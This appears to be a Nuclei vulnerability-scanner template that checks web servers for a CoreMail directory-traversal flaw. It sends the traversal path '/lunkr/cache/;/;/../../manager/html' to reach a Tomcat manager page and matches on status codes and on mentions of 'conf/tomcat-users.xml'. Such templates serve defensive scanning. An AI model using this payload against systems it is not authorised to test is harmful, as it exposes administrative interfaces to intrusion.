id: coremail-directory-traversal
info:
  name: CoreMail Directory Traversal Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: directory-traversal
http:
  - method: GET
    path:
      - "{{BaseURL}}/manager/html"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        negative: true
        words:
          - "conf/tomcat-users.xml"
  - method: GET
    path:
      - "{{BaseURL}}/lunkr/cache/;/;/../../manager/html"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 401
      - type: word
        part: body
        words:
          - "conf/tomcat-users.xml"
